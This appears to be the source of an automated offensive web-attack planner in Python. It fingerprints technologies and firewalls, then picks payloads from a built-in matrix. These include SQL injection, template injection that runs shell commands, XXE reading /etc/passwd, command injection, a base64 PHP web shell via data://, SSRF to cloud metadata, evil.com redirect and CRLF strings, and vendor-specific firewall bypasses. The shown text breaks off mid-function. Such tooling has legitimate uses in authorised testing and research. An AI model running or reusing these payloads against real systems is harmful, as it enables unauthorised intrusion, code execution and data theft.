"""
Neural Attack Planner
======================

An advanced AI system that thinks like an elite pentester by:

1. MULTI-SITUATIONAL ANALYSIS
   - Analyzes multiple attack vectors simultaneously
   - Finds correlations between different observations
   - Identifies compound vulnerabilities

2. PATTERN RECOGNITION
   - Recognizes attack patterns from responses
   - Detects WAF/filter behavior patterns
   - Identifies technology fingerprints

3. DECISION MATRIX
   - Weighs multiple factors for each decision
   - Considers risk vs. reward
   - Prioritizes based on success probability

4. ADAPTIVE LEARNING
   - Learns from each request/response
   - Adapts payloads in real-time
   - Remembers what works across sessions

5. COMPOUND ATTACKS
   - Chains multiple vulnerabilities
   - Combines low-severity into high-severity
   - Creates novel attack paths

Author: canigetrichpls
"""

import asyncio
import json
import re
import hashlib
from dataclasses import dataclass, field
from enum import Enum, auto
# L1 NOTE: Using typing module generics (Dict, List, etc.) for Python 3.8 compatibility.
# Python 3.9+ supports lowercase generics (dict, list) directly.
from typing import Any, Dict, List, Optional, Set, Tuple
from collections import defaultdict
from datetime import datetime
from urllib.parse import urljoin, quote
import structlog

logger = structlog.get_logger(__name__)


# =============================================================================
# CONSTANTS (M3 FIX 2026-02-13)
# =============================================================================

TIMING_ANOMALY_THRESHOLD = 3.0  # seconds beyond baseline
SIZE_ANOMALY_THRESHOLD = 500    # bytes difference
CONTEXT_WINDOW_SIZE = 100       # characters around payload
WAF_BYPASS_PROBABILITY = 0.4    # default bypass attempt probability
MAX_ITERATIONS_LIMIT = 100      # maximum exploitation iterations

# H5 FIX 2026-02-13: Bounded list limits
MAX_SIGNALS = 500
MAX_VECTORS = 200
MAX_EXPLOITS = 100


class BoundedList(list):
    """
    A list with a maximum size that discards oldest items when full.

    H5 FIX: Prevents memory exhaustion via unbounded growth.
    """

    def __init__(self, maxlen: int, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._maxlen = maxlen

    def append(self, item):
        if len(self) >= self._maxlen:
            self.pop(0)
        super().append(item)

    def extend(self, items):
        for item in items:
            self.append(item)


# =============================================================================
# NEURAL MODELS
# =============================================================================

class SignalType(Enum):
    """Types of signals the neural planner can detect."""
    # Response signals
    REFLECTION = auto()           # Input reflected in output
    ERROR_DISCLOSURE = auto()     # Error message leaked info
    TIMING_ANOMALY = auto()       # Response time unusual
    SIZE_ANOMALY = auto()         # Response size unusual
    STATUS_CHANGE = auto()        # HTTP status changed
    REDIRECT = auto()             # Redirect occurred
    
    # Security signals
    WAF_BLOCK = auto()            # WAF blocked request
    RATE_LIMIT = auto()           # Rate limiting hit
    FILTER_DETECTED = auto()      # Input filtering detected
    SANITIZATION = auto()         # Input sanitization detected
    
    # Vulnerability signals
    XSS_POSSIBLE = auto()         # XSS might work
    SQLI_POSSIBLE = auto()        # SQLi might work
    IDOR_POSSIBLE = auto()        # IDOR might work
    SSRF_POSSIBLE = auto()        # SSRF might work
    LFI_POSSIBLE = auto()         # LFI might work
    AUTH_WEAK = auto()            # Auth seems weak

    # FIX 2026-02-19: Added missing vulnerability signals
    SSTI_POSSIBLE = auto()        # Server-side template injection
    XXE_POSSIBLE = auto()         # XML external entity
    CMDI_POSSIBLE = auto()        # Command injection
    CRLF_POSSIBLE = auto()        # Header injection / CRLF
    NOSQL_POSSIBLE = auto()       # NoSQL injection
    DESERIALIZATION_POSSIBLE = auto()  # Insecure deserialization
    JWT_WEAK = auto()             # JWT vulnerabilities
    CORS_MISCONFIGURED = auto()   # CORS misconfiguration
    OPEN_REDIRECT_POSSIBLE = auto()    # Open redirect
    PATH_TRAVERSAL_POSSIBLE = auto()   # Path traversal

    # Technology signals
    TECH_PHP = auto()
    TECH_JAVA = auto()
    TECH_DOTNET = auto()
    TECH_NODEJS = auto()
    TECH_PYTHON = auto()
    TECH_RUBY = auto()

    # FIX 2026-02-19: OOB/Blind detection signals
    OOB_SSRF = auto()          # SSRF confirmed via OOB callback
    OOB_XXE = auto()           # XXE confirmed via OOB callback
    OOB_RCE = auto()           # RCE confirmed via OOB callback
    OOB_SQLI = auto()          # Blind SQLi via OOB (Oracle, MSSQL, etc.)
    OOB_SSTI = auto()          # SSTI confirmed via OOB callback
    BLIND_TIMING = auto()      # Blind injection via timing difference
    BLIND_BOOLEAN = auto()     # Blind injection via boolean condition


class PlannerPhase(Enum):
    """Current phase of the attack."""
    RECONNAISSANCE = auto()
    ENUMERATION = auto()
    VULNERABILITY_ANALYSIS = auto()
    EXPLOITATION = auto()
    POST_EXPLOITATION = auto()


class HttpMethod(Enum):
    """HTTP methods for attack vectors."""
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"
    PATCH = "PATCH"


class BodyType(Enum):
    """Body content types for POST/PUT requests."""
    NONE = "none"
    FORM = "application/x-www-form-urlencoded"
    JSON = "application/json"
    XML = "application/xml"
    MULTIPART = "multipart/form-data"


@dataclass
class Signal:
    """A signal detected during analysis."""
    type: SignalType
    strength: float  # 0.0 to 1.0
    source: str      # What triggered this signal
    evidence: Dict[str, Any] = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class AttackVector:
    """A potential attack vector with probability scoring."""
    name: str
    type: str
    target: str
    payload: str

    # Scoring
    success_probability: float = 0.0  # 0.0 to 1.0
    impact_score: float = 0.0         # 0.0 to 1.0
    risk_score: float = 0.0           # Risk of detection

    # FIX 2026-02-19: HTTP method and body support
    method: HttpMethod = HttpMethod.GET
    body_type: BodyType = BodyType.NONE
    headers: Dict[str, str] = field(default_factory=dict)
    param_name: str = "test"  # Parameter name for injection

    # Requirements
    prerequisites: List[str] = field(default_factory=list)
    signals_needed: List[SignalType] = field(default_factory=list)

    # State
    attempted: bool = False
    successful: bool = False
    result: Dict[str, Any] = field(default_factory=dict)


@dataclass
class NeuralState:
    """The neural planner's current state."""
    phase: PlannerPhase = PlannerPhase.RECONNAISSANCE
    signals: List[Signal] = field(default_factory=list)
    vectors: List[AttackVector] = field(default_factory=list)
    
    # Knowledge base
    target_tech: Set[str] = field(default_factory=set)
    blocked_patterns: Set[str] = field(default_factory=set)
    working_patterns: Set[str] = field(default_factory=set)
    
    # Metrics
    requests_made: int = 0
    successful_attacks: int = 0
    
    # Response baseline
    baseline_length: int = 0
    baseline_time: float = 0.0
    baseline_status: int = 200


@dataclass
class ExploitChain:
    """A chain of exploits that work together."""
    name: str
    steps: List[AttackVector]
    combined_probability: float
    combined_impact: float
    poc: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# SIGNAL DETECTION ENGINE
# =============================================================================

class SignalDetector:
    """Detects signals from HTTP responses."""
    
    # Patterns for technology detection
    TECH_PATTERNS = {
        SignalType.TECH_PHP: [
            r"\.php", r"PHPSESSID", r"X-Powered-By:\s*PHP",
            r"laravel", r"symfony", r"wordpress", r"drupal",
        ],
        SignalType.TECH_JAVA: [
            r"\.jsp", r"JSESSIONID", r"java\.", r"springframework",
            r"struts", r"tomcat", r"jboss",
        ],
        SignalType.TECH_DOTNET: [
            r"\.aspx?", r"ASP\.NET", r"__VIEWSTATE", r"__EVENTVALIDATION",
            r"X-AspNet-Version", r"X-Powered-By:\s*ASP\.NET",
        ],
        SignalType.TECH_NODEJS: [
            r"express", r"X-Powered-By:\s*Express", r"node\.js",
            r"npm", r"webpack", r"\.mjs",
        ],
        SignalType.TECH_PYTHON: [
            r"django", r"flask", r"gunicorn", r"uwsgi",
            r"\.py", r"python", r"jinja",
        ],
        SignalType.TECH_RUBY: [
            r"\.rb", r"ruby", r"rails", r"sinatra",
            r"X-Powered-By:\s*Phusion",
        ],
    }
    
    # Patterns for vulnerability detection
    VULN_PATTERNS = {
        SignalType.SQLI_POSSIBLE: [
            r"mysql", r"mariadb", r"postgres", r"sqlite", r"oracle",
            r"sql syntax", r"query failed", r"database error",
            r"ORA-\d+", r"PLS-\d+", r"SQL Server",
        ],
        SignalType.XSS_POSSIBLE: [
            # Canary reflected without encoding
        ],
        SignalType.LFI_POSSIBLE: [
            r"failed to open stream", r"no such file", r"include\(",
            r"require\(", r"file_get_contents",
        ],
        SignalType.SSRF_POSSIBLE: [
            r"connection refused", r"connection timed out", r"couldn't connect",
            r"getaddrinfo", r"name or service not known",
        ],
        # FIX 2026-02-19: Added patterns for new vulnerability types
        SignalType.SSTI_POSSIBLE: [
            r"\{\{.*\}\}", r"\$\{.*\}", r"<%.*%>",
            r"jinja2", r"twig", r"freemarker", r"velocity",
            r"UndefinedError", r"TemplateSyntaxError", r"TemplateError",
            r"mako\.exceptions", r"pebble", r"thymeleaf",
        ],
        SignalType.XXE_POSSIBLE: [
            r"DOCTYPE", r"ENTITY", r"SYSTEM",
            r"XMLParser", r"lxml", r"simplexml",
            r"entity.*expansion", r"external.*entity",
            r"SAXParseException", r"XMLSyntaxError",
        ],
        SignalType.CMDI_POSSIBLE: [
            r"sh:", r"bash:", r"/bin/sh", r"/bin/bash",
            r"command not found", r"syntax error",
            r"cannot execute", r"permission denied",
            r"uid=\d+", r"gid=\d+",  # id command output
        ],
        SignalType.CRLF_POSSIBLE: [
            r"Set-Cookie:.*\r\n", r"Location:.*\r\n",
            r"HTTP/1\.[01].*\r\n\r\n",
        ],
        SignalType.NOSQL_POSSIBLE: [
            r"mongodb", r"mongoose", r"\$where", r"\$gt", r"\$ne",
            r"bson", r"objectid", r"aggregation",
            r"MongoError", r"CastError",
        ],
        SignalType.DESERIALIZATION_POSSIBLE: [
            r"java\.io\.ObjectInputStream", r"pickle\.loads",
            r"unserialize\(", r"ObjectInputStream",
            r"ClassNotFoundException", r"InvalidClassException",
            r"ysoserial", r"gadget chain",
        ],
        SignalType.JWT_WEAK: [
            r"alg.*none", r"alg.*HS256", r"jwt\.decode",
            r"invalid signature", r"token expired",
            r"eyJ[A-Za-z0-9_-]*\.eyJ",  # JWT pattern
        ],
        SignalType.CORS_MISCONFIGURED: [
            r"Access-Control-Allow-Origin:\s*\*",
            r"Access-Control-Allow-Credentials:\s*true",
            r"Access-Control-Allow-Origin:.*null",
        ],
        SignalType.OPEN_REDIRECT_POSSIBLE: [
            r"redirect.*http", r"location:.*http",
            r"url=http", r"next=http", r"return=http",
            r"callback=http", r"dest=http",
        ],
        SignalType.PATH_TRAVERSAL_POSSIBLE: [
            r"\.\.\/", r"\.\.\\\\", r"etc/passwd",
            r"windows\\system32", r"boot\.ini",
            r"root:.*:0:0:", r"\[boot loader\]",
        ],
    }
    
    # WAF signatures - Theme 11: Updated for 2026
    WAF_SIGNATURES = {
        # Traditional WAFs
        "cloudflare": [r"cf-ray", r"cloudflare", r"__cf_bm", r"cf-mitigated"],
        "akamai": [r"akamai", r"ak_bmsc", r"akamai-grn"],
        "aws_waf": [r"awswaf", r"x-amzn-waf-"],
        "aws_cloudfront": [r"x-amz-cf-id", r"x-amz-cf-pop"],
        "imperva": [r"imperva", r"incapsula", r"visid_incap", r"x-iinfo"],
        "f5": [r"f5", r"big-ip", r"bigipserver", r"ts[a-z0-9]{6,}"],
        "modsecurity": [r"mod_security", r"modsec", r"NOYB"],
        "sucuri": [r"sucuri", r"x-sucuri"],
        # Modern edge platforms
        "vercel": [r"x-vercel-", r"vercel"],
        "netlify": [r"x-nf-request-id", r"netlify"],
        "fastly": [r"x-served-by.*cache", r"fastly-"],
        # Bot protection
        "datadome": [r"datadome", r"x-datadome"],
        "perimeterx": [r"_pxhd", r"_px", r"px-captcha"],
        "shape": [r"_abck", r"bm_sz"],
    }
    
    def detect_signals(
        self,
        response_text: str,
        response_headers: Dict[str, str],
        status_code: int,
        elapsed_time: float,
        canary: str = None,
        baseline: NeuralState = None,
    ) -> List[Signal]:
        """Detect all signals from a response."""
        signals = []
        
        combined = f"{response_text} {json.dumps(response_headers)}".lower()
        
        # Technology detection
        for signal_type, patterns in self.TECH_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.I):
                    signals.append(Signal(
                        type=signal_type,
                        strength=0.8,
                        source=f"Pattern: {pattern}",
                        evidence={"matched": pattern},
                    ))
                    break
        
        # Vulnerability patterns
        for signal_type, patterns in self.VULN_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, combined, re.I)
                if match:
                    signals.append(Signal(
                        type=signal_type,
                        strength=0.7,
                        source=f"Error pattern: {pattern}",
                        evidence={"matched": match.group()},
                    ))
                    break
        
        # Canary reflection (XSS potential)
        if canary and canary in response_text:
            # Check if it's HTML encoded or not
            encoded_canary = canary.replace("<", "&lt;").replace(">", "&gt;")
            if canary in response_text and encoded_canary not in response_text:
                signals.append(Signal(
                    type=SignalType.XSS_POSSIBLE,
                    strength=0.9,
                    source="Unencoded reflection",
                    evidence={"canary": canary, "context": self._get_context(response_text, canary)},
                ))
            else:
                signals.append(Signal(
                    type=SignalType.REFLECTION,
                    strength=0.6,
                    source="Canary reflected (may be encoded)",
                    evidence={"canary": canary},
                ))
        
        # WAF detection
        for waf_name, patterns in self.WAF_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.I):
                    signals.append(Signal(
                        type=SignalType.WAF_BLOCK if status_code in [403, 406] else SignalType.FILTER_DETECTED,
                        strength=0.9,
                        source=f"WAF: {waf_name}",
                        evidence={"waf": waf_name, "pattern": pattern},
                    ))
                    break
        
        # Status code analysis
        if status_code in [403, 406, 429]:
            signals.append(Signal(
                type=SignalType.WAF_BLOCK if status_code != 429 else SignalType.RATE_LIMIT,
                strength=0.9,
                source=f"Status code: {status_code}",
            ))
        
        # Timing analysis - M3 FIX: Use constant
        if baseline and elapsed_time > baseline.baseline_time + TIMING_ANOMALY_THRESHOLD:
            signals.append(Signal(
                type=SignalType.TIMING_ANOMALY,
                strength=min((elapsed_time - baseline.baseline_time) / 10, 1.0),
                source=f"Delayed response: {elapsed_time:.2f}s vs baseline {baseline.baseline_time:.2f}s",
                evidence={"elapsed": elapsed_time, "baseline": baseline.baseline_time},
            ))

        # Size analysis - M3 FIX: Use constant
        if baseline and abs(len(response_text) - baseline.baseline_length) > SIZE_ANOMALY_THRESHOLD:
            signals.append(Signal(
                type=SignalType.SIZE_ANOMALY,
                strength=0.6,
                source=f"Size change: {len(response_text)} vs baseline {baseline.baseline_length}",
                evidence={"size": len(response_text), "baseline": baseline.baseline_length},
            ))

        return signals

    def _get_context(self, html: str, canary: str, context_size: int = CONTEXT_WINDOW_SIZE) -> str:
        """Get context around canary in HTML."""
        pos = html.find(canary)
        if pos == -1:
            return ""
        start = max(0, pos - context_size)
        end = min(len(html), pos + len(canary) + context_size)
        return html[start:end]


# =============================================================================
# NEURAL DECISION ENGINE
# =============================================================================

class NeuralDecisionEngine:
    """Makes intelligent attack decisions based on signals."""
    
    # Decision matrix: signal combinations -> attack strategies
    DECISION_MATRIX = {
        # Single signal decisions
        (SignalType.XSS_POSSIBLE,): {
            "strategy": "xss_exploitation",
            "priority": 10,
            "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        },
        (SignalType.SQLI_POSSIBLE,): {
            "strategy": "sqli_exploitation",
            "priority": 10,
            "payloads": ["' OR '1'='1", "1' AND '1'='1", "' UNION SELECT NULL--"],
        },
        (SignalType.REFLECTION,): {
            "strategy": "xss_probing",
            "priority": 8,
            "payloads": ["<test>", "\"onclick=\"", "'onmouseover='"],
        },
        
        # Multi-signal decisions (more sophisticated)
        (SignalType.REFLECTION, SignalType.TECH_PHP): {
            "strategy": "php_xss",
            "priority": 9,
            "payloads": ["<?=alert(1)?>", "<script>alert(1)</script>", "{{constructor}}"],
        },
        (SignalType.REFLECTION, SignalType.TECH_NODEJS): {
            "strategy": "node_xss",
            "priority": 9,
            "payloads": ["{{constructor.constructor('return this')()}}", "${7*7}"],
        },
        (SignalType.TIMING_ANOMALY, SignalType.SQLI_POSSIBLE): {
            "strategy": "blind_sqli",
            "priority": 10,
            "payloads": ["'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--"],
        },
        (SignalType.WAF_BLOCK,): {
            "strategy": "waf_bypass",
            "priority": 7,
            "payloads": [],  # Will be generated dynamically
        },
        (SignalType.SIZE_ANOMALY, SignalType.IDOR_POSSIBLE): {
            "strategy": "idor_exploitation",
            "priority": 9,
            "payloads": ["1", "2", "0", "-1", "admin"],
        },

        # FIX 2026-02-19: Added decision patterns for new vulnerability types

        # SSTI patterns
        (SignalType.SSTI_POSSIBLE,): {
            "strategy": "ssti_exploitation",
            "priority": 10,
            "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}", "{{self.__class__}}"],
        },
        (SignalType.SSTI_POSSIBLE, SignalType.TECH_PYTHON): {
            "strategy": "jinja2_ssti",
            "priority": 10,
            "payloads": [
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ],
        },
        (SignalType.SSTI_POSSIBLE, SignalType.TECH_JAVA): {
            "strategy": "java_ssti",
            "priority": 10,
            "payloads": [
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "${7*7}",
                "*{T(java.lang.System).getenv()}",
            ],
        },

        # XXE patterns
        (SignalType.XXE_POSSIBLE,): {
            "strategy": "xxe_exploitation",
            "priority": 10,
            "payloads": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>',
            ],
        },

        # Command Injection patterns
        (SignalType.CMDI_POSSIBLE,): {
            "strategy": "cmdi_exploitation",
            "priority": 10,
            "payloads": ["; id", "| id", "$(id)", "`id`", "&& id", "|| id"],
        },
        (SignalType.CMDI_POSSIBLE, SignalType.TECH_PHP): {
            "strategy": "php_cmdi",
            "priority": 10,
            "payloads": ["; cat /etc/passwd", "| cat /etc/passwd", "; phpinfo()"],
        },

        # NoSQL patterns
        (SignalType.NOSQL_POSSIBLE,): {
            "strategy": "nosql_exploitation",
            "priority": 9,
            "payloads": ['{"$gt":""}', '{"$ne":null}', '{"$where":"1==1"}', "[$ne]=1"],
        },

        # CRLF patterns
        (SignalType.CRLF_POSSIBLE,): {
            "strategy": "crlf_exploitation",
            "priority": 8,
            "payloads": ["%0d%0aSet-Cookie:pwned=1", "%0d%0aX-Injected:true", "\r\nLocation:http://evil.com"],
        },

        # JWT patterns — structural payloads (alg:none, weak secret, kid injection)
        (SignalType.JWT_WEAK,): {
            "strategy": "jwt_exploitation",
            "priority": 9,
            "payloads": [
                '{"alg":"none"}',               # alg:none bypass
                '{"alg":"HS256"}',               # force symmetric
                '{"kid":"../../dev/null"}',      # kid path traversal
            ],
        },

        # CORS patterns — origin reflection probes
        (SignalType.CORS_MISCONFIGURED,): {
            "strategy": "cors_exploitation",
            "priority": 8,
            "payloads": [
                "https://evil.com",       # arbitrary origin
                "null",                   # null origin bypass
                "https://target.evil.com",  # subdomain spoof
            ],
        },

        # Deserialization patterns
        (SignalType.DESERIALIZATION_POSSIBLE,): {
            "strategy": "deserialization_exploitation",
            "priority": 9,
            "payloads": [
                'O:8:"stdClass":0:{}',                         # PHP
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",      # Java (base64)
                "__import__('os').system('id')",                 # Python pickle
            ],
        },

        # Open Redirect patterns
        (SignalType.OPEN_REDIRECT_POSSIBLE,): {
            "strategy": "redirect_exploitation",
            "priority": 7,
            "payloads": ["//evil.com", "https://evil.com", "/\\evil.com", "//evil.com/%2f.."],
        },

        # Path Traversal patterns
        (SignalType.PATH_TRAVERSAL_POSSIBLE,): {
            "strategy": "path_traversal_exploitation",
            "priority": 9,
            "payloads": ["../etc/passwd", "....//....//etc/passwd", "..%2f..%2fetc%2fpasswd"],
        },
        (SignalType.PATH_TRAVERSAL_POSSIBLE, SignalType.TECH_PHP): {
            "strategy": "php_lfi_rce",
            "priority": 10,
            "payloads": [
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            ],
        },

        # Multi-signal sophisticated patterns
        (SignalType.REFLECTION, SignalType.TECH_JAVA): {
            "strategy": "java_xss",
            "priority": 9,
            "payloads": [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)</script>',
            ],
        },
        (SignalType.LFI_POSSIBLE, SignalType.TECH_PHP): {
            "strategy": "php_lfi",
            "priority": 10,
            "payloads": [
                "php://filter/convert.base64-encode/resource=../config.php",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
            ],
        },
        (SignalType.SSRF_POSSIBLE, SignalType.TECH_NODEJS): {
            "strategy": "node_ssrf",
            "priority": 9,
            "payloads": [
                "http://127.0.0.1:22",
                "http://localhost:6379",
                "http://169.254.169.254/latest/meta-data/",
            ],
        },

        # WAF bypass combinations
        (SignalType.WAF_BLOCK, SignalType.SQLI_POSSIBLE): {
            "strategy": "waf_bypass_sqli",
            "priority": 9,
            "payloads": [
                "'/**/OR/**/1=1--",
                "' /*!50000OR*/ 1=1--",
                "'+OR+1=1--",
            ],
        },
        (SignalType.WAF_BLOCK, SignalType.XSS_POSSIBLE): {
            "strategy": "waf_bypass_xss",
            "priority": 9,
            "payloads": [],  # Generated dynamically from WAF_BYPASS
        },
    }

    # WAF bypass techniques by WAF type - FIX 2026-02-19: Updated for modern WAFs
    WAF_BYPASS = {
        "cloudflare": [
            "<svg onload=alert`1`>",
            "<img src=x onerror=alert&#40;1&#41;>",
            "<script>alert(String.fromCharCode(49))</script>",
            "<img src=x onerror=alert&#x28;1&#x29;>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
            "<!--><svg/onload=alert(1)-->",
        ],
        "akamai": [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img/src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<body onpageshow=alert(1)>",
        ],
        "aws_waf": [
            "<%00script>alert(1)</script>",
            "<script>al\\u0065rt(1)</script>",
            "<script>\\u0061lert(1)</script>",
            "<svg><animate onbegin=alert(1)>",
        ],
        "imperva": [
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert&#40;1&#41;>",
            "<math href=javascript:alert(1)>click</math>",
        ],
        "f5": [
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            "<svg><script>alert&lpar;1&rpar;</script>",
        ],
        "modsecurity": [
            "<img src=x onerror=\\u0061lert(1)>",
            "<!--><script>alert(1)</script>-->",
            "<svg><animate onbegin=alert(1) attributeName=x>",
        ],
        "generic": [
            "<svg onload=alert(1)>",
            "<img src=x onerror=alert`1`>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<img src=x onerror=&#97;lert(1)>",
            "<img src=x onerror=\\u0061lert(1)>",
        ],
    }
    
    def __init__(self):
        self.decisions_made: List[Dict] = []
    
    def analyze_signals(
        self,
        signals: List[Signal],
        state: NeuralState,
    ) -> List[AttackVector]:
        """Analyze signals and generate attack vectors."""
        vectors = []
        
        # Get signal types present
        signal_types = set(s.type for s in signals)
        
        # Check decision matrix for matching patterns
        for pattern, decision in self.DECISION_MATRIX.items():
            if all(st in signal_types for st in pattern):
                # Generate vectors based on decision
                vectors.extend(self._generate_vectors(decision, signals, state))
        
        # If WAF detected, add bypass vectors
        waf_signals = [s for s in signals if s.type == SignalType.WAF_BLOCK]
        if waf_signals:
            vectors.extend(self._generate_waf_bypass_vectors(waf_signals, state))
        
        # Score and sort vectors
        vectors = self._score_vectors(vectors, signals, state)
        vectors.sort(key=lambda v: v.success_probability * v.impact_score, reverse=True)
        
        return vectors
    
    def _generate_vectors(
        self,
        decision: Dict,
        signals: List[Signal],
        state: NeuralState,
    ) -> List[AttackVector]:
        """Generate attack vectors from a decision with appropriate HTTP methods."""
        vectors = []
        strategy = decision["strategy"]
        priority = decision["priority"]

        # FIX 2026-02-19: Determine methods and body types based on strategy and signals
        methods_and_bodies = self._get_methods_for_strategy(strategy, signals)

        for payload in decision.get("payloads", []):
            # Skip blocked patterns
            if payload in state.blocked_patterns:
                continue

            # Create vectors for each method/body combination
            for method, body_type, param_name in methods_and_bodies:
                vector = AttackVector(
                    name=f"{strategy}_{method.value}_{hashlib.md5(payload.encode()).hexdigest()[:6]}",
                    type=strategy,
                    target="",  # Will be filled later
                    payload=payload,
                    success_probability=priority / 10,
                    impact_score=self._get_impact_score(strategy),
                    method=method,
                    body_type=body_type,
                    param_name=param_name,
                )
                vectors.append(vector)

        return vectors

    def _get_methods_for_strategy(
        self,
        strategy: str,
        signals: List[Signal],
    ) -> List[Tuple[HttpMethod, BodyType, str]]:
        """Determine HTTP methods and body types for a strategy based on signals."""
        # Check if we detected JSON API from recon
        has_json_api = any(
            s.evidence.get("body_type") == "json"
            for s in signals
            if hasattr(s, "evidence") and s.evidence
        )

        # Check if we detected form-based from recon
        has_form_api = any(
            s.evidence.get("body_type") == "form"
            for s in signals
            if hasattr(s, "evidence") and s.evidence
        )

        # Strategy-specific method mappings
        # Format: (HttpMethod, BodyType, param_name)
        strategy_methods = {
            # Injection strategies - test multiple methods
            "sqli_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "id"),
                (HttpMethod.POST, BodyType.FORM, "id"),
                (HttpMethod.POST, BodyType.JSON, "id"),
            ],
            "blind_sqli": [
                (HttpMethod.GET, BodyType.NONE, "id"),
                (HttpMethod.POST, BodyType.FORM, "id"),
            ],
            "xss_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "q"),
                (HttpMethod.POST, BodyType.FORM, "search"),
            ],
            "xss_probing": [
                (HttpMethod.GET, BodyType.NONE, "test"),
                (HttpMethod.POST, BodyType.FORM, "input"),
            ],
            # SSTI - template engines often use POST
            "ssti_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "template"),
                (HttpMethod.POST, BodyType.FORM, "template"),
                (HttpMethod.POST, BodyType.JSON, "template"),
            ],
            "jinja2_ssti": [
                (HttpMethod.POST, BodyType.FORM, "template"),
                (HttpMethod.POST, BodyType.JSON, "template"),
            ],
            "java_ssti": [
                (HttpMethod.POST, BodyType.FORM, "template"),
                (HttpMethod.POST, BodyType.JSON, "template"),
            ],
            # XXE - XML body required
            "xxe_exploitation": [
                (HttpMethod.POST, BodyType.XML, "data"),
            ],
            # Command injection
            "cmdi_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "cmd"),
                (HttpMethod.POST, BodyType.FORM, "command"),
                (HttpMethod.POST, BodyType.JSON, "command"),
            ],
            "php_cmdi": [
                (HttpMethod.GET, BodyType.NONE, "cmd"),
                (HttpMethod.POST, BodyType.FORM, "cmd"),
            ],
            # NoSQL - often JSON APIs
            "nosql_exploitation": [
                (HttpMethod.POST, BodyType.JSON, "username"),
                (HttpMethod.POST, BodyType.FORM, "username"),
            ],
            # CRLF - typically in URL or headers
            "crlf_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "redirect"),
            ],
            # JWT - typically in Authorization header
            "jwt_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "test"),
            ],
            # Deserialization - POST with various content types
            "deserialization_exploitation": [
                (HttpMethod.POST, BodyType.FORM, "data"),
                (HttpMethod.POST, BodyType.JSON, "data"),
            ],
            # IDOR - test multiple methods for write operations
            "idor_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "id"),
                (HttpMethod.PUT, BodyType.JSON, "id"),
                (HttpMethod.DELETE, BodyType.NONE, "id"),
            ],
            # SSRF
            "ssrf_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "url"),
                (HttpMethod.POST, BodyType.FORM, "url"),
                (HttpMethod.POST, BodyType.JSON, "url"),
            ],
            "node_ssrf": [
                (HttpMethod.POST, BodyType.JSON, "url"),
            ],
            # Path traversal / LFI
            "path_traversal_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "file"),
                (HttpMethod.POST, BodyType.FORM, "path"),
            ],
            "php_lfi": [
                (HttpMethod.GET, BodyType.NONE, "page"),
                (HttpMethod.GET, BodyType.NONE, "file"),
            ],
            "php_lfi_rce": [
                (HttpMethod.GET, BodyType.NONE, "file"),
                (HttpMethod.POST, BodyType.FORM, "file"),
            ],
            # Open redirect
            "redirect_exploitation": [
                (HttpMethod.GET, BodyType.NONE, "url"),
                (HttpMethod.GET, BodyType.NONE, "redirect"),
                (HttpMethod.GET, BodyType.NONE, "next"),
            ],
            # WAF bypass - same as target vuln
            "waf_bypass": [
                (HttpMethod.GET, BodyType.NONE, "test"),
                (HttpMethod.POST, BodyType.FORM, "test"),
            ],
            "waf_bypass_sqli": [
                (HttpMethod.GET, BodyType.NONE, "id"),
                (HttpMethod.POST, BodyType.FORM, "id"),
            ],
            "waf_bypass_xss": [
                (HttpMethod.GET, BodyType.NONE, "q"),
                (HttpMethod.POST, BodyType.FORM, "q"),
            ],
        }

        # Get strategy-specific methods or default
        methods = strategy_methods.get(strategy, [
            (HttpMethod.GET, BodyType.NONE, "test"),
        ])

        # If we detected JSON API, prioritize JSON methods
        if has_json_api and not any(m[1] == BodyType.JSON for m in methods):
            methods.append((HttpMethod.POST, BodyType.JSON, "test"))

        # If we detected form API, ensure form methods are included
        if has_form_api and not any(m[1] == BodyType.FORM for m in methods):
            methods.append((HttpMethod.POST, BodyType.FORM, "test"))

        return methods
    
    def _generate_waf_bypass_vectors(
        self,
        waf_signals: List[Signal],
        state: NeuralState,
    ) -> List[AttackVector]:
        """Generate WAF bypass vectors."""
        vectors = []
        
        # Identify WAF type
        waf_type = "generic"
        for signal in waf_signals:
            if "waf" in signal.evidence:
                waf_type = signal.evidence["waf"]
                break
        
        # Get appropriate bypass payloads
